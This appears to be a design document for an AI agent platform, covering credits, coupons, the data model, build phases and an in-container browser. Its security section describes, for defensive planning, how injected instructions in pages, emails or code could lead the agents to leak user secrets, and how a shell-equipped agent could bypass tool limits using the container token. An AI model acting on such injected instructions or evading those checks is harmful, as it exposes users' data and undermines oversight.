| `order.paid` for a renewal | New monthly grant (90 days); earlier monthly credits keep their own expiry |
| `subscription.canceled` → `subscription.revoked` | Plan kept until the end of the period → back to Free (credits already granted keep their 90-day expiry) |
| `order.paid` for a top-up | Top-up grant (800 credits per $10) |
| `refund.created` / `refund.updated` (succeeded) | Negative grant for the refunded share; if Polar refunded to prevent a chargeback, take back all of it and flag the account |

- **No double-crediting:** every webhook id is unique in `events`, and every grant's idempotency key comes from Polar's ids (order, refund, subscription + period).
- **Plan changes** take effect when Polar's webhook arrives, never from the web app directly.
- **Disputes:** Polar has no dispute webhook. Polar refunds many disputed payments itself before they become chargebacks; those arrive as refunds and are handled above. A dispute Polar does not refund is handled by hand (admin credit adjustment + flag).

### 7.7 Coupon codes (free top-up credits)

**What they're for:** you hand out free credits (to testers, friends, launch promos) without paying out of pocket for more than you choose.

**Admin creates a coupon** (admin API):
- campaign name, credits per redemption (e.g. 200), max total redemptions (e.g. 20), expiry date
- credit expiry after redemption (default 90 days), **cheap-model-only** flag (default on)
- optionally: new users only, or specific plans only
- optionally **generate N single-use codes** for one campaign

**The code is shown to the admin once.** Only its **hash** is stored, plus a short visible prefix (e.g. `AGT-7K…`) for the admin list.

**Code format:** 16+ random characters from an unambiguous alphabet (no 0/O, 1/I), grouped as `AGT-XXXX-XXXX-XXXX`. Generated with a secure random source.

**Redeem flow** (web app, or by sending the code in chat):
1. **Rate limit:** at most 5 attempts per user per hour and 20 per IP per hour, counted in Redis. Wrong codes count too.
2. **Eligibility:** email verified **and** at least one linked chat app. This stops fake-account farming.
3. Hash the code → find an **active, unexpired** coupon.
4. **In one database transaction:**
   - check `redeemed_count < max_redemptions`, and increase it atomically
   - insert the redemption; a **unique (coupon, user)** rule makes a second use impossible
   - create the grant (credits, 30-day expiry, cheap-model flag)
   - write the ledger entry
5. Raise the LiteLLM budget → reply with "+200 credits, expire on …".

**Security rules:**
- Every answer is the same generic "invalid or expired code" for wrong, expired, used-up or not-eligible codes, so attackers can't probe which codes exist.
- Admins can **disable a campaign instantly**. Credits already granted stay unless the admin chooses to revoke them.
- Every redemption goes into the ledger and the audit log (user, coupon, IP, time).
- **Abuse signals** (many accounts redeeming from one IP) are flagged for the admin.
- Coupon grants with the cheap-model flag can only pay for cheap-model AI, awake time and app actions. A Pro user's Claude usage draws from their other grants.
  - **Why app actions are allowed:** the flag exists to keep free credits away from expensive models. An app action is a fixed 1-credit platform charge like awake time, on every plan including Free, so any grant may pay it. If only normal grants could, a user holding only coupon credits would run up a debt with every action.

### 7.8 Free-budget control

- Your real spend on free users = sign-up credits + coupon credits, at real cost (≈ credits ÷ 2.5 ÷ 100 dollars).
- Example: $10/month of free AI ≈ 2,500 credits ≈ 25 sign-ups (100 each), or 12 coupon redemptions of 200.
- The admin view shows **"free credits granted this month"**, with an optional **monthly cap** that blocks new sign-up grants and coupon redemptions when reached.

---

## 8. Data model (tables and key fields)

| Module | Table | Key fields |
|---|---|---|
| auth | users | id, clerk_id, email_verified, name, timezone, plan, role (user/admin), created_at, deleted_at |
| auth | link_codes | code_hash, user_id, expires_at, used_at |
| auth | channel_links | user_id, channel (whatsapp/telegram/imessage), external_id (unique), last_inbound_at (for the 24 h rule) |
| events | events | id, source, external_id (unique with source), type, user_id, payload, status, created_at |
| channels | messages | id, user_id, channel, direction, text, media_ref, status, event_id |
| orchestrator | approvals | id, user_id, action_summary, status (pending/approved/rejected/expired), expires_at |
| integrations | connections | user_id, app, composio_account_id, status |
| integrations | user_mcp_servers | user_id, url, domain, auth_secret (encrypted), enabled |
| integrations | byok_keys | user_id, provider, key (encrypted) |
| orchestrator | agent_settings | user_id, runtime (hermes/claude_code), ai_preference (auto/platform), claude_connected_at |
| orchestrator | memories | id, user_id, kind (preference/person/project/instruction/fact), content (one line, at most 300 characters), confirmed_at, last_used_at, use_count, created_at, updated_at |
| orchestrator | chat_engines | user_id, session_key, runtime (**the three together are the key**), last_turn_at |
| automations | automations | id, user_id, kind (once/repeat/event), schedule/cron, timezone, trigger_ref, instruction, preset (null/pr_review), enabled, fail_count, next_run_at |
| automations | pr_reviews | user_id, owner, repo, pr_number, head_sha (**unique together**), automation_id, event_id, status (requested/done/failed) |
| billing | subscriptions | user_id, plan, polar_subscription_id, status, period_start, period_end |
| billing | credit_grants | id, user_id, source, amount, remaining, expires_at, cheap_model_only, ref (payment/coupon id) |
| billing | credit_ledger | id, user_id, grant_id, delta, reason (grant/charge/expire/refund/adjust), idempotency_key (unique), meta, created_at |
| billing | usage_periods | user_id, period_start, period_end, ai_cost, awake_seconds, browser_seconds, browser_credits, credits_charged |
| billing | coupons | id, campaign, code_hash (unique), code_prefix, credits, max_redemptions, redeemed_count, expires_at, credit_expiry_days, cheap_model_only, new_users_only, active, created_by |
| billing | coupon_redemptions | coupon_id, user_id (**unique together**), ip, grant_id, created_at |
| admin | audit_log | id, user_id, actor (user/agent/admin/system), action, details, created_at |
| vm-manager | sandboxes | user_id, container_id, image_version, state (stopped/waking/awake/busy/broken), last_active_at, mcp_token_hash, bridge_secret_hash, allowlist, awake_log |

- Every user-owned query filters by user_id.
- Secrets use encrypted columns.
- **The `sandboxes` table belongs only to the vm-manager.** The backend reads its state through gRPC, never directly.

---

## 9. Build phases (hand these to the AI one at a time)

**How to use:** give the AI **one phase** plus this document. Each phase lists what to read, what to build, and **done when…** checks. Don't start a phase until the previous one's checks pass.

### Phase 0: Foundations
- **Read:** 1, 2, 3, 4
- **Build:**
  - repo structure (section 2)
  - `infra/docker-compose` for **local development**: Postgres, Redis, LiteLLM, Caddy and the egress proxy on the three networks from section 4
  - env/config loading and validation
  - lint, format and test setup; CI running them, **including a Redocly lint of `openapi/openapi.yaml`**
  - a script that copies the spec to `user-frontend/ignore/`
- **Done when:** `docker compose up` starts everything healthy; containers on the sandbox network can reach only the egress proxy (test it).

### Phase 1: Backend skeleton
- **Read:** 0.1, 0.2, 5, 8
- **Build:**
  - api (Hono) with health endpoint
  - **OpenAPI wiring:** TypeScript types generated from `openapi.yaml`, a request-validation middleware, the shared `Error` shape, and contract tests that check responses against the spec
  - Drizzle schema + migrations for **auth, events, channels, admin** tables
  - Clerk token check + `user.created` / `user.deleted` webhooks
  - generic webhook intake (verify → event → job)
  - BullMQ's 4 queues, worker process, per-user lock, retries, Bull Board (admin only)
- **Done when:**
  - every implemented route passes its contract test against `openapi.yaml`
  - a signed test webhook creates exactly one event and one job, even if sent twice
  - two jobs for the same user never run at the same time
  - a crashed job is retried

### Phase 2: vm-manager + agent image
- **Read:** 0.5, 0.6, 1.2 (gRPC), 6
- **Build:**
  - the proto contract
  - the Go gRPC service with every RPC
  - Docker + gVisor container spec
  - the `sandboxes` table
  - idle reaper, capacity guard, health checker, reconciler
  - egress allowlist writer
  - agent image: Hermes + Bridge (HTTP, secret-checked, reports turn done)
  - TypeScript client generated into the backend
- **Done when:**
  - Create → Wake → Deliver("hello") streams *turn_done*
  - it's stopped after 3 idle minutes and wakes again with memory intact
  - the capacity cap is respected
  - a container can't reach the internet except through allowed domains
  - **one container's measured RAM is recorded** in the README (used to set the awake cap)

### Phase 3: Telegram end to end
- **Read:** 0.1 (linking), 0.3 (Telegram notes), 5.2
- **Build:**
  - link codes
  - Telegram webhook + send
  - process-message → Wake → Deliver
  - Platform MCP with send_message + get_profile
  - outbound job
- **Done when:** a linked Telegram user chats with their own agent; an unlinked user only gets the link message; two users' agents never see each other's data.

### Phase 4: Platform MCP tools, Composio, approvals
- **Read:** 5.1, 0.5 (approvals)
- **Build:**
  - Composio connect links + webhook
  - run_app_action / list_app_actions with the forced user id
  - request_approval with Telegram buttons
  - the approval flow back into the agent
  - user MCP servers + allowlist updates
  - audit log
- **Done when:** "email X that…" drafts, asks for approval, sends only after ✅, and is audit-logged; a container can't act as another user even with a crafted request.

### Phase 5: Credits, plans, coupons, payments
- **Read:** 7 (all), 8 (billing tables)
- **Build:**
  - billing tables
  - sign-up grant
  - LiteLLM key per user with a budget
  - sync-usage + charging with spending order + idempotency
  - balance enforcement (before, during, at zero)
  - Polar checkout + webhooks (subscribe, renew, cancel, top-up, refund)
  - monthly grants + expiry jobs
  - **coupons**: admin create, redeem with every rule in 7.7 (endpoints `/v1/coupons/redeem` and `/v1/admin/coupons*` as in the spec)
  - plan limits (apps, automations, models)
  - bring-your-own key
- **Done when:**
  - usage lowers the balance correctly and re-running a sync doesn't double-charge
  - at 0 credits the agent stops and says so
  - Polar sandbox purchases add credits exactly once
  - **coupon tests pass:** a second redemption by the same user fails, the (max+1)th redemption fails even with 50 parallel attempts, expired and disabled codes fail with the generic message, the rate limit kicks in, unverified users can't redeem, and coupon credits expire after 90 days and pay only for the cheap model

### Phase 6: WhatsApp, media, Jev
- **Read:** 0.3, 5.2
- **Build:**
  - WhatsApp webhook + send + templates + the 24-hour rule
  - voice to text and media download
  - Jev routing (simple vs task, app pick, spam) with a fallback if Jev is down
- **Done when:** WhatsApp works like Telegram; a reminder 25 hours later arrives as a template; simple questions don't wake a container.

### Phase 7: Automations and reminders
- **Read:** 0.4
- **Build:**
  - `automations` table
  - schedule_reminder / create_automation / list / cancel tools
  - delayed and repeating jobs with timezones
  - Composio triggers
  - auto-pause rules
  - re-register on start
- **Done when:** once, repeating and app-event automations fire correctly across a worker restart and a Redis wipe, and pause at 0 credits.

### Phase 8: Hardening
- **Read:** 10
- **Build:**
  - nightly backups (Postgres + volumes) and a restore test
  - rate limits on public endpoints
  - structured logs + basic metrics and alerts
  - the admin views (failed jobs, free-credit spend, coupon abuse flags)
  - iMessage via Sendblue (if budget allows)
  - load test at the awake cap
- **Done when:** a restore from backup works; the load test holds the cap without failures; the security checklist in 10.2 is all ticked.

---

## 10. Failures and security

### 10.1 Failures

| Failure | Handling |
|---|---|
| Duplicate webhook | Unique event key → ignored |
| Worker crash | BullMQ re-runs; steps are safe to repeat |
| Container won't start | Retry → re-create from the image (keep /data) → broken + alert + user told |
| Server full | Stop the longest-idle container; else the job waits |
| LiteLLM / model down | Backup model → retry later → "delayed" message |
| Composio down | The tool returns an error to the agent; the user is told |
| Search provider down or not set up | `web_search` tells the agent; nothing is charged; the turn goes on |
| GitHub can't be asked for a pull request's head commit | The head commit in the event is used; with none, no review runs and the activity log says why |
| A review's job runs out of retries (vm-manager down for minutes) | The commit stays claimed by that event, so no later event reviews it twice. It is reviewed if that event's job is run again; otherwise the next push gets its own review |
| vm-manager down | Wake/Deliver jobs retry with backoff; the rest keeps working |
| The browser switch can't be sent (vm-manager down when a plan changes) | The *sync-browser* job retries with backoff. If it runs out of tries, the next turn sees the difference after the wake and sends the switch again; it takes effect on the wake after that |
| The engine of a turn can't be recorded or read (Redis) | `read_page` uses the strict seen-address rule: the safe side |
| Memory or the chat history can't be read when a turn starts | The turn is delivered without the memory block or the recap; a warning is logged |
| Jev down | Treat every message as a task (no routing shortcut) |
| Polar webhook late | Credits are added when it arrives; the web app shows "processing" |
| Redis lost | Rebuild jobs from `events`; re-register automations |

### 10.2 Security checklist
- [ ] Only Caddy is exposed; every other service is on the private networks from section 4; `/mcp` and `/git` answer 404 from outside
- [ ] Every webhook is verified before parsing and deduplicated
- [ ] The Docker socket is mounted **only** in the vm-manager
- [ ] Containers: gVisor, limits, read-only files, sandbox network, egress allowlist, only their own secrets. The open way out exists only for a container with the browser on (Max); private, loopback, link-local, metadata and internal addresses are refused for every container (sections 4 and 10.3)
- [ ] No Composio/provider/database keys in containers; the Platform MCP forces the user id from the token
- [ ] No GitHub token in containers: git goes through the git gateway, which forces the user id from the container token and refuses pushes to the default branch
- [ ] Secrets encrypted in Postgres; tokens and codes stored as hashes
- [ ] Approvals before sending to others, deleting or paying; audit log for every action
- [ ] Pull-request review: comments run without approval only on repos the user turned review on for, only the four named actions, never approve, merge, reply or another repo; the agent can't turn it on; the instruction carries no text from the pull request
- [ ] `read_page` reaches public addresses only: private, loopback, link-local, metadata and internal hosts are refused, at every redirect and again when connecting; limits on time, size and redirects; rate limited
- [ ] `read_page` on Hermes can't be used to send data out: it fetches only an address already seen for this user (their own messages, a `web_search` result, a link on a page already read), at every redirect too. An address the agent made up is refused. The strict rule also applies whenever no turn is on record as running on Claude Code
- [ ] `read_page` on Claude Code opens any public address (decided 2026-10-04): the agent image lets only Scout call it there, and Scout has no files, no shell and no app tools. The platform can't check which agent calls (section 10.3)
- [ ] Scout's browser: on only for Max users, and only when `BROWSER_AVAILABLE` is on; off again after the user leaves Max; charged per second through the usage sync; no wake at zero credits (section 11)
- [ ] Shared memory: per user only (the user id comes from the container token; another user's memory id answers "not found"); a memory is one line and can't write the block's own lines; the block says its notes are data and can't approve anything; obvious secrets are refused when saving; no memory text in the audit log; deleted with the account (section 0.9)
- [ ] Coupon rules from 7.7; rate limits on redeem, link codes and login-linked endpoints
- [ ] Nightly off-server backups with a tested restore

### 10.3 What is open, said plainly

Two decisions of 2026-10-04 each give up a check the platform had: Scout's browser inside the container (section 11), and `read_page` opening any public address on Claude Code (section 5.1). This section says what each one leaves open.

**1. A Max user's container with the browser on can reach any public website.**

That container holds:

- the user's **files** in `/data`, and the **code** it cloned;
- the engine's own **memory** and chat sessions. The shared memory lives on the platform, but its block is put at the top of every turn (section 0.9), so the agent has it;
- **git access** to the user's GitHub repos through the git gateway (clone, fetch, push to branches);
- the user's **Claude sign-in**, when they connected their Claude plan: Claude Code keeps its credentials in `/data`;
- the container's own secrets: its Platform MCP token, its Bridge secret, the user's LiteLLM key, and on Max the secrets of the user's own MCP servers.

Before the browser, nothing in that container had a way out that the platform did not check. With the browser on, **anything running in it can send any of that to any public site.** One injected instruction is enough: in a web page Scout reads, an email, a pull request's code, a file.

**What still limits the damage:**

- **One user, one container.** It is that user's data only. The container is sandboxed (gVisor), holds no other user's data, and the platform takes the user id from the container's token, never from what an agent says.
- **The keys that matter most never enter a container:** Composio's, the model providers', the database's, and the GitHub token (the git gateway keeps it). A leak can't act in the user's apps by itself.
- **Approvals still hold.** Sending to other people, deleting and paying need the user's approval on the platform (section 5.1). An injected agent can't approve its own request.
- **The container's own tokens are of little use outside.** `/mcp`, `/git` and LiteLLM are not reachable from the internet (section 4), so a copied Platform MCP token or LiteLLM key works only from inside our networks. The git gateway refuses pushes to the default branch whoever asks.
- **Internal addresses stay closed.** The open way out is to public websites only; private, loopback, link-local and metadata addresses and the platform's own services stay refused (section 4).
- **Only containers the platform switched it on for.** Max plan, and only while `BROWSER_AVAILABLE` is on. Free and Pro containers stay locked, and so does every container while the setting is off. Leaving Max closes the way out again on the container's next wake.
- **On Claude Code the browser is Scout's alone,** by its tool list, and Scout has no files, no shell and no app tools. The agent that reads untrusted pages is not the agent that holds the files.
- **Browser time costs credits** and shows in usage, and a user at zero credits is not woken at all.

**What does not limit it:**

- **Nothing checks where the container connects.** No allowlist, no seen-address rule, no approval. The platform does not see the browser's traffic, and the activity log shows only calls to the platform's own tools.
- **The network is open for the whole container, not only for the browser.** The lead and Byte have a shell, and a shell command reaches the same sites. They also read text other people wrote (emails, files, a pull request's code), so an injected instruction there needs no browser at all.
- **On Hermes the tool limits are instructions** (section 0.7). Any Hermes agent can be told to use the browser.
- **The Claude sign-in works from anywhere.** Unlike the container's own tokens, a copied Claude credential can be used outside our network until the user signs that session out. The same goes for the secrets of the user's own MCP servers.
- **Typing into pages.** Whatever Scout types into a form leaves the container.
- **Sign-ins, when they come** (section 11.6): the browser's cookies would sit in the same container.

**What follows from it:**

- **The trust line on the landing page** says the sandbox reaches only approved services. For a Max user with the browser on that is no longer true. The wording has to change before the browser is offered (`docs/launch-plan.md` section 2).
- **`BROWSER_AVAILABLE` is the switch for the whole server.** Off, no container is opened, whatever the plan.

**2. `read_page` on Claude Code opens any public address.**

- **What is given up:** the seen-address rule, for turns that run on Claude Code, on every plan. An injected page can tell Scout to fetch an address with data in it.
- **What Scout has to give:** its task text and what it read on the web. It has no files, no shell and no app tools, and the lead is told to put no secrets or private data into a task.
- **What still limits it:**
  - public addresses only, at every redirect, checked again when connecting (section 5.1);
  - a plain GET with no cookies and no sign-in;
  - 30 pages a minute per user;
  - every read is in the activity log (the address without its query string), and a read of an address that had not been seen is marked;
  - outside a turn that is on record as running on Claude Code, the strict rule applies.
- **What does not: the platform trusts the agent image for "only Scout".** Every call from a container carries the same container token, so the platform can't tell Scout from the lead or Byte. The tool lists and the hook are enforced by Claude Code inside the container. **An agent with a shell can go around them:** the container's token is in the container's own configuration, and a shell command can call `/mcp` with it and ask for `read_page` itself. So on Claude Code an injected instruction that reaches the lead, Byte or Patch can send data out through `read_page`, one GET at a time, 30 a minute, each in the activity log. On Hermes the strict rule closes this.
- **What would close it:** a token for Scout's tools that the shell can't read, or the token kept out of the shell's reach. Both are the agent image's side (`vm-manager`). Not built.

---

## 11. Scout's browser (first version)

**Status:** decided 2026-10-04 (`docs/launch-plan.md` D10). This replaces the proposal that stood here before, which recommended a hosted browser (Browserbase) driven by six platform tools: that plan is cancelled, and no hosted provider is used. The platform side is in this repo; the browser itself is in the agent image and the vm-manager (`vm-manager` repo). The old comparison and the providers' prices are in this file's history (`git log -- docs/mvp-hld.md`, before 2026-10-04).

### 11.1 What was decided

- **Where:** the browser runs **inside the user's own container.** Not at a hosted provider.
- **Who:** the **Max plan** only. **Only Scout drives it.**
- **Price:** **2 credits per minute** of browser time.
- **What it is for:** pages that `read_page` can't read: pages that need JavaScript, clicks or forms. `read_page` stays the tool for plain pages; it is free and on every plan.
- **Signing in to sites** is wanted and is **not in this first version** (section 11.6). The first version is for public pages.

**What the decision buys and what it costs.**

- **Bought:** no supplier and no monthly bill; no third party sees the pages Scout opens; when sign-ins come, the cookies stay on our server and not at a provider.
- **Paid:** the locked network, for the containers that have the browser on (section 10.3), and server memory, since a browser is heavier than an idle agent (the vm-manager's sizing).

### 11.2 Who does what

| Part | Repo | Does |
|---|---|---|
| **Agent image** | `vm-manager` | Carries the browser and the tools that drive it. Gives them to Scout only: by tool list on Claude Code, by instruction on Hermes (section 0.7). Reports the seconds the browser was in use |
| **vm-manager** | `vm-manager` | Keeps `browser_enabled` per container. On a wake, starts the container with or without the browser and with or without the open way out (section 4). Stores browser seconds with each awake period and returns them in *GetUsage* |
| **Platform** | this repo | Decides who has the browser (plan and setting) and tells the vm-manager. Charges the browser seconds. Tells the apps who has it. Nothing else: the platform does not see what the browser does |

**The gRPC contract** (`vm-manager/proto/vm/v1/vm.proto`; this repo only reads it):

- `CreateSandboxRequest.browser_enabled` (bool): the state a new container starts with.
- `Sandbox.browser_enabled` (bool): the state the vm-manager has on record. It comes back from *CreateSandbox*, *WakeSandbox*, *GetSandbox* and *SetBrowser*.
- `SetBrowser(user_id, enabled)` → the sandbox. **It takes effect on the user's next wake.**
- `UserUsage.browser_seconds` in *GetUsage*: was always 0, now real.

**No platform tools for the browser.** The six `browser_*` tools of the cancelled plan do not exist on the Platform MCP. The browser's tools are inside the container.

### 11.3 The switch: who has the browser

**The rule.** The browser is on for a user when both hold:

1. **the user's plan includes it:** Max (`limits.browser` in section 7.1);
2. **the deployment has it:** the setting **`BROWSER_AVAILABLE`** is on. The agent image is deployed apart from the backend, and the backend can't see which image runs, so this setting says so. **It is off by default:** until the image with the browser is deployed, no container is opened and the apps don't promise a browser.

Otherwise it is off.

**When the platform sends it.** It always sends the wanted state (on or off), never "flip it", so every one of these can be repeated safely:

| When | How |
|---|---|
| **A container is created** (sign-up) | `browser_enabled` in *CreateSandbox* |
| **The plan changes:** upgrade to Max, downgrade from Max, a cancelled subscription reaching its end | Billing reports the change; a **`sync-browser`** job on the *system* queue reads the plan again and calls *SetBrowser*. It retries like any job (section 0.2). No container yet: nothing to do, the container will be created with the right state |
| **After every wake** | The woken sandbox says what it has on record. If that differs from the rule, *SetBrowser* is sent again. This catches a job that ran out of tries, a container made before the browser existed, and the setting being switched on or off |

- **A change takes effect on the next wake.** A user who upgrades while their container is awake gets the browser after the container has stopped and woken again (it stops after 3 quiet minutes). A user who leaves Max while awake keeps it until then; those minutes are charged.
- **A plan changes only from Polar's webhooks or when a cancelled period ends** (section 7.6), so that is where the job is added. The dev script (`scripts/dev-user.ts create`) sets a plan directly and sends the switch itself.
- **Only Max containers are ever opened.** The setting alone opens nothing.

### 11.4 Money

- **2 credits per minute of browser time: 1 credit per 30 seconds.** The vm-manager counts the seconds the browser was in use and returns them in *GetUsage*; the usage sync turns them into credits (section 7.4). Nothing new was needed on the platform: the sync already read and charged `browser_seconds`, which was always 0.
- **Part minutes carry over** between syncs, the way awake time does: 20 seconds in one sync and 10 in the next is 1 credit. Nothing is rounded up.
- **Charged once.** Browser time is part of the one charge per user per usage period, which has a unique key (user, period start). A sync that runs twice, or the 5-minute job and the after-turn sync running together, can't charge it twice.
- **Awake time is charged as well.** The container is awake while the browser runs: 1 credit per 10 minutes on top. A browser minute costs 2.1 credits in all.
- **The AI is charged apart.** A browser turn sends many page snapshots to the model. That is Textcrew AI in credits, or the user's own key or Claude plan (section 7.1).
- **In usage:** each period carries `browserSeconds` and `browserCredits`, and the totals carry `browserCredits` (`GET /v1/usage`). The credit history line reads `Usage: …, browser N`.
- **At zero credits the container is not woken** (section 7.5), so no browser runs. **Inside a turn the browser is not cut off** when the credits run out: a turn lasts 15 minutes at most, so the overrun is at most 30 credits of browser time, recovered from the next grant.
- **A turn reversed as our fault** gives its browser credits back with the rest of the turn (section 7.2).
- **Whoever's browser seconds arrive are charged.** The plan is checked when the browser is switched on, not when it is charged: a user who left Max and used the browser until their container stopped pays for those minutes.

### 11.5 What the apps are told

- **`GET /v1/plans`:** Max has `limits.browser: true` and the feature line "Browser use: 2 credits per minute". Free and Pro have neither.
- **`GET /v1/crew`,** Scout's `browser`:
  - `requiresPlan`: `max`;
  - `available`: this deployment has the browser (`BROWSER_AVAILABLE`);
  - `enabled`: it is on for this user (`available`, and the user's plan includes it). This is the state the platform sends to the vm-manager.
- **Scout's description** says the real browser needs the Max plan.
- **`GET /v1/usage`:** `browserSeconds` and `browserCredits` (section 11.4).
- **No screen shows the browser itself.** That comes with signing in (section 11.6).

### 11.6 The next step: signing in to sites (not built)

**Decided 2026-10-04** (`docs/launch-plan.md` D10): the browser may be used on sites that need a sign-in. **The user signs in themselves; the agent never sees the password.** It is not in the first version because it needs a way for the user to see the browser, and none exists.

**How a sign-in would go:**

1. Scout reaches a sign-in page and stops. Through the lead, it tells the user that the site needs them to sign in.
2. The user opens the browser session in the **web app** and signs in there: user name, password, a code from their phone. They type into the real page, not into the chat.
3. The user says they are done (a button), and Scout goes on, now signed in.

**What it needs:**

- **A way for the user to see and type into the browser in their container.** A live view of the container's browser, passed from the vm-manager through the api to the web app, for the user's own session only. Nothing like it exists; it is the main piece of work. Telegram can't show a browser: the chat gets a line that names the web app.
- **The agent kept out while the user types.** The browser's tools are paused for that session until the user says they are done. The agent never types into a password field, and what it reads from a page leaves out the values of password fields. A user who sends a password in chat is told to sign in in the web app instead.
- **Somewhere for the sign-in to live.** The cookies would be in the browser's profile in the user's `/data` volume: on our server, in the nightly backup, and within reach of anything running in the container (section 10.3). That last point is the cost of having the browser in the container.
- **A screen for the user:** which sites the browser is signed in to, and a way to sign out of one or of all. Deleting the account removes them.
- **A rule for a signed-in site.** There, Scout acts as the user: it can post, buy, delete or change settings by clicking. It needs its own limit before it is built, for example: Scout reads freely, and a click that submits a form asks the user first, like a risky app action (section 5.1).

**For the founder to decide** (all open):

- **How long a sign-in is kept:** until the user signs out, or for a fixed time (for example 30 days).
- **Which sites:** any site, or not some kinds (banks, the user's email, password managers).
- **What Scout may do on a signed-in site** without asking: read only, or also click and submit.
- **The minutes the user spends signing in:** charged at 2 credits per minute like the rest, or free.

### 11.7 Limits of the first version, and what is not checked

- **Public pages only;** no sign-ins (section 11.6).
- **No address rule for the browser.** The platform can't apply the seen-address rule to a browser inside the container (section 10.3).
- **No view of the browser for the user,** and no list of the pages it opened: the activity log shows the platform's own tools, and the browser is not one of them. Crew progress lines (`Scout: …`) are what the user sees.
- **A change of plan reaches the browser on the next wake,** not at once (section 11.3).
- **Not checked from this repo:** how the browser runs under gVisor, how much memory it needs and what that does to the awake cap, how browser seconds are counted, and that the open way out refuses internal addresses. These are the vm-manager's and the image's side.

> Hosting, server setup and sizing live in a separate doc, `docs/deployment.md`. They are not needed to write the code.
